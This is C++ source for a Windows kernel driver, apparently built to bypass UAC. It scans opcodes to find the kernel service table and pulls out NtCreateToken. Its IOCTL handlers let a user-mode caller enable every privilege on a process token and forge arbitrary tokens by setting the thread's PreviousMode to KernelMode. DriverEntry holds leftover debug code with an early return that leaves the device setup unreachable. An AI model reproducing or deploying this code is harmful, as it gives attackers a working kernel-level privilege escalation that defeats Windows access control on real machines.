#pragma comment(linker, "/ENTRY:DriverEntry")

#define ML_DEBUG_KERNEL 1

#include "MyLibrary.cpp"
#include "DriverHelper.h"

TYPE_OF(NtCreateToken)  *KiCreateToken;

ULONG_PTR PreviousModeOffset;

NTSTATUS CreateToken(PBH_CREATE_TOKEN Create)
{
    NTSTATUS            Status;
    KPROCESSOR_MODE     PreviousMode;
    PETHREAD            Thread;
    OBJECT_ATTRIBUTES   oa;
    UNICODE_STRING      ObjectName;

    Thread = KeGetCurrentThread();
    PreviousMode = ExGetPreviousMode();

    *(KPROCESSOR_MODE *)PtrAdd(Thread, PreviousModeOffset) = KernelMode;

    oa.Length                   = Create->ObjectAttributes->Length;
    oa.RootDirectory            = (HANDLE)Create->ObjectAttributes->RootDirectory;
    oa.ObjectName               = NULL;
    oa.Attributes               = Create->ObjectAttributes->Attributes;
    oa.SecurityDescriptor       = (PVOID)Create->ObjectAttributes->SecurityDescriptor;
    oa.SecurityQualityOfService = (PVOID)Create->ObjectAttributes->SecurityQualityOfService;

    Status = KiCreateToken(
                (PHANDLE)Create->TokenHandle,
                Create->DesiredAccess,
                &oa,
                (TOKEN_TYPE)Create->TokenType,
                (PLUID)Create->AuthenticationId,
                Create->ExpirationTime,
                (PTOKEN_USER)Create->User,
                (PTOKEN_GROUPS)Create->Groups,
                (PTOKEN_PRIVILEGES)Create->Privileges,
                (PTOKEN_OWNER)Create->Owner,
                (PTOKEN_PRIMARY_GROUP)Create->PrimaryGroup,
                (PTOKEN_DEFAULT_DACL)Create->DefaultDacl,
                (PTOKEN_SOURCE)Create->TokenSource
            );

    *(KPROCESSOR_MODE *)PtrAdd(Thread, PreviousModeOffset) = PreviousMode;

    return Status;
}

NTSTATUS AdjustAllPrivilege(PBH_ADJUST_PRIVILEG AdjustPrivilege)
{
    NTSTATUS                Status;
    HANDLE                  Token;
    ULONG                   ReturnLength;
    ULONG_PTR               PrivilegeCount, BufferLength, SePrivilege;
    PTOKEN_PRIVILEGES       Privileges, PreviousState;
    PLUID_AND_ATTRIBUTES    Luid;

    DEBUG_BREAK_POINT();

    Status = ZwOpenProcessToken(AdjustPrivilege->Process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token);
    FAIL_RETURN(Status);

    PrivilegeCount = SE_MAX_WELL_KNOWN_PRIVILEGE - SE_MIN_WELL_KNOWN_PRIVILEGE + 1;
    BufferLength = sizeof(Privileges->PrivilegeCount) + sizeof(Privileges->Privileges[0]) * PrivilegeCount;
    Privileges = (PTOKEN_PRIVILEGES)AllocStack(BufferLength);
    PreviousState = (PTOKEN_PRIVILEGES)AllocStack(BufferLength);

    Privileges->PrivilegeCount = PrivilegeCount;

    SePrivilege = SE_MIN_WELL_KNOWN_PRIVILEGE;
    FOR_EACH(Luid, Privileges->Privileges, PrivilegeCount)
    {
        Luid->Luid.LowPart = SePrivilege++;
        Luid->Luid.HighPart = 0;
        Luid->Attributes = SE_PRIVILEGE_ENABLED;
    }

    Status = ZwAdjustPrivilegesToken(Token, FALSE, Privileges, BufferLength, PreviousState, &ReturnLength);
    ZwClose(Token);

    return Status;
}

NTSTATUS
NTAPI
BhDispatchDeviceControl(
    PDEVICE_OBJECT  DeviceObject,
    PIRP            Irp
)
{
    NTSTATUS            Status;
    ULONG_PTR           ParamSize;
    PIO_STACK_LOCATION  IoStack;

    union
    {
        PBH_OPEN_PROCESS_TOKEN  OpenToken;
        PBH_CREATE_TOKEN        CreateToken;
        PBH_ADJUST_PRIVILEG     AdjustPrivilege;
        PVOID Input;
    };

    IoStack = IoGetCurrentIrpStackLocation(Irp);
    Status  = STATUS_INVALID_DEVICE_REQUEST;

    Input = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
    ParamSize = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    switch (FUNCTION_FROM_CTL_CODE(IoStack->Parameters.DeviceIoControl.IoControlCode))
    {
        case BhAdjustPrivilege:
            Status = AdjustAllPrivilege(AdjustPrivilege);
            break;

        case BhOpenProcessToken:
            if (ParamSize != sizeof(*OpenToken))
            {
                Status = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            Status = ZwOpenProcessToken(OpenToken->Process, OpenToken->Access, (PHANDLE)OpenToken->Token);
            break;

        case BhCreateToken:
            if (ParamSize != sizeof(*CreateToken))
            {
                Status = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            Status = ::CreateToken(CreateToken);
            break;
    }

    Irp->IoStatus.Status      = Status;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return Status;
}

NTSTATUS
NTAPI
BhDispatchCreateClose(
    PDEVICE_OBJECT  DeviceObject,
    PIRP            Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;

    Irp->IoStatus.Status        = Status;
    Irp->IoStatus.Information   = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return Status;
}

ULONG_PTR KiGetPreviousModeOffset()
{
    PBYTE Buffer;
    LONG_PTR Length;

    Buffer = (PBYTE)ExGetPreviousMode;

    for (LONG_PTR MaxSize = 0x10; MaxSize > 0; )
    {
        Length = GetOpCodeSize(Buffer);
        switch (Buffer[0])
        {
            case 0x8A:
                if (Length != 6)
                    break;

                return *(PULONG)(Buffer + 2);

            // 0fb680 32020000  movzx   eax,byte ptr [rax+232h]
            case 0x0F:
                if (Length != 7)
                    break;

                if (Buffer[1] != 0xB6 || Buffer[2] != 0x80)
                    break;

                return *(PULONG)(Buffer + 3);
        }

        Buffer += Length;
        MaxSize -= Length;
    }

    return 0;
}

ULONG_PTR KiGetServiceIndexByRoutine(PVOID Routine)
{
    PBYTE       Buffer;
    LONG_PTR    Length;
    ULONG_PTR   ServiceIndex;

    ServiceIndex = ~0u;

    Buffer = (PBYTE)Routine;
    for (LONG_PTR MaxSize = 0x20; MaxSize > 0; )
    {
        Length = GetOpCodeSize(Buffer);
        switch (Buffer[0])
        {
            case 0xB8:
                if (Length != 5)
                    break;

                ServiceIndex = *(PULONG)(Buffer + 1);
                return ServiceIndex;
        }

        Buffer += Length;
        MaxSize -= Length;
    }

    return ~0u;
}

PVOID KiFindKiServiceTable(PLDR_MODULE nt)
{
    PVOID       KiServiceTable;
    ULONG_PTR   ProbeIndex;
    LDR_MODULE  newnt;
    PKSERVICE_TABLE_DESCRIPTOR SSDT;

    ProbeIndex = KiGetServiceIndexByRoutine(ZwSetEvent);
    if (ProbeIndex == -1)
        return NULL;

    newnt = *nt;

#if ML_AMD64

    PVOID reloadnt;
    NTSTATUS Status;

    Status = ReLoadDll(nt->FullDllName.Buffer, &reloadnt, nt->DllBase, RELOAD_DLL_IGNORE_IAT | RELOAD_DLL_NOT_RESOLVE_PATH);
    if (NT_FAILED(Status))
        return NULL;

    newnt.DllBase = reloadnt;

#endif

    auto RelocateCheck = [] (PRELOCATE_ADDRESS_INFO Address, PVOID PointerToAddress) -> BOOL
    {
        if (*(PVOID *)Address->Context == NULL)
            *(PVOID *)Address->Context = (PVOID *)PointerToAddress;

        return FALSE;
    };

    RELOCATE_ADDRESS_INFO Address[] =
    {
        { NtSetEvent, NULL, RelocateCheck, &KiServiceTable },
    };

    KiServiceTable = NULL;
    RelocateAddress(&newnt, Address, countof(Address));

    if (KiServiceTable != NULL)
        KiServiceTable = (PVOID *)KiServiceTable - ProbeIndex;

#if ML_AMD64

    if (KiServiceTable != NULL)
        KiServiceTable = PtrAdd(KiServiceTable, PtrOffset(nt->DllBase, newnt.DllBase));

    UnLoadDll(reloadnt);

#endif

    return KiServiceTable;
}

PVOID GetSerivceRoutine(PVOID KiServiceTable, ULONG_PTR ServiceIndex)
{
#if ML_X86
    return ((PVOID *)KiServiceTable)[ServiceIndex];

#elif ML_AMD64
    return PtrAdd(KiServiceTable, ((PLONG)KiServiceTable)[ServiceIndex] >> 4);
#else
#error

#endif

}

PVOID GetNtCreateToken(PLDR_MODULE nt)
{
    ULONG_PTR   NtCreateTokenIndex;
    PVOID      *KiServiceTable, ntdll;
    PBYTE       ZwCreateToken;
    NTSTATUS    Status;

    KiServiceTable = (PVOID *)KiFindKiServiceTable(nt);
    if (KiServiceTable == NULL)
        return NULL;

    NtCreateTokenIndex = ~0u;

    Status = ReLoadDll(L"\\SystemRoot\\System32\\ntdll.dll", (PVOID *)&ntdll, NULL, RELOAD_DLL_IGNORE_IAT | RELOAD_DLL_NOT_RESOLVE_PATH);
    if (!NT_SUCCESS(Status))
        return NULL;

    ZwCreateToken = (PBYTE)EATLookupRoutineByHashPNoFix(ntdll, NTDLL_NtCreateToken);
    if (ZwCreateToken != NULL)
        NtCreateTokenIndex = KiGetServiceIndexByRoutine(ZwCreateToken);

    UnLoadDll(ntdll);

    if (NtCreateTokenIndex == -1)
        return NULL;

    return GetSerivceRoutine(KiServiceTable, NtCreateTokenIndex);
}

VOID NTAPI DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING SymbolicName;

    RTL_CONST_STRING(SymbolicName, BYPASS_UAC_DEVICE_SYMBOLIC);
    IoDeleteDevice(DriverObject->DeviceObject);
    IoDeleteSymbolicLink(&SymbolicName);
}

NTSTATUS NTAPI DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    NTSTATUS            Status;
    UNICODE_STRING      DeviceName, SymbolicName;
    OBJECT_ATTRIBUTES   ObjectAttributes;
    PDEVICE_OBJECT      DeviceObject;

    DEBUG_BREAK_POINT();

    PLDR_MODULE nt;

    nt = LookupPsLoadedModuleList((PLDR_MODULE)DriverObject->DriverSection, _ReturnAddress());
    PVOID KiServiceTable;

    KiServiceTable = KiFindKiServiceTable(nt);

    KDPC Dpc;
    KTIMER Timer;
    PKTIMER NextTimer;
    LARGE_INTEGER DueTime;

    FormatTimeOut(&DueTime, 1000);

    KeInitializeDpc(&Dpc,
        [] (PKDPC Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2)
        {
            return;
        },
        0
    );

    KeInitializeTimerEx(&Timer, SynchronizationTimer);
    if (!KeSetTimerEx(&Timer, DueTime, 1000, &Dpc))
        return 0;

    NextTimer = &Timer;
    do
    {
        DbgPrint("Dpc = %p, DueTime = %I64d\n", NextTimer->Dpc, NextTimer->DueTime.QuadPart);
        NextTimer = FIELD_BASE(NextTimer->TimerListEntry.Flink, KTIMER, TimerListEntry);

    } while (NextTimer != &Timer);

    KeCancelTimer(&Timer);

    return 0;

    PreviousModeOffset = KiGetPreviousModeOffset();
    if (PreviousModeOffset == 0)
        return STATUS_UNSUCCESSFUL;

    *(PVOID *)&KiCreateToken = GetNtCreateToken(LookupPsLoadedModuleList((PLDR_MODULE)DriverObject->DriverSection, _ReturnAddress())->NextLoadOrder());
    if (KiCreateToken == 0)
        return STATUS_UNSUCCESSFUL;

    DriverObject->DriverUnload = DriverUnload;

    RTL_CONST_STRING(DeviceName, BYPASS_UAC_DEVICE_NAME);

    Status = IoCreateDevice(
                DriverObject,
                0,
                &DeviceName,
                FILE_DEVICE_UNKNOWN,
                0,
                FALSE,
                &DeviceObject
             );
    FAIL_RETURN(Status);

    RTL_CONST_STRING(SymbolicName, BYPASS_UAC_DEVICE_SYMBOLIC);
    Status = IoCreateSymbolicLink(&SymbolicName, &DeviceName);
    if (!NT_SUCCESS(Status))
    {
        IoDeleteDevice(DeviceObject);
        return Status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE]                  = BhDispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]                   = BhDispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]          = BhDispatchDeviceControl;

    return STATUS_SUCCESS;
}
